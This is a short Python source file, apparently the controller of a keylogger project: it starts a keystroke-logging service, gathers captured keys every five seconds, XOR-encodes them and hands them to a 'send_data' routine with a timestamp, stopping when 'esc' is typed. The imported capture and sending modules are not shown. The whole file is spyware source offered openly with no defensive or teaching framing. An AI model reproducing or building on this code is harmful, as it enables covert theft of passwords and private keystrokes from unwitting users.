import time
from KeyLoggerService import KeyLoggerService
from Encryption import Encryption
from FileWriter import FileWrite
class KeyloggerManager:
    def __init__(self):
        self.keylogger = KeyLoggerService()
        self.encode = Encryption(5)
        self.file = FileWrite()
        self.running = True

    def start(self):
        self.keylogger.start_logging()

        while self.running:
            time.sleep(5)
            log_data = " ".join(self.keylogger.get_logged_keys())
            ncrypted_data = self.encode.xor_decryption(log_data)
            self.file.send_data(ncrypted_data,time.strftime("%Y-%m-%d %H:%M:%S"))
            if "esc" in log_data:
                self.running = False
            self.keylogger.logged_keys = []





manager = KeyloggerManager()
manager.start()



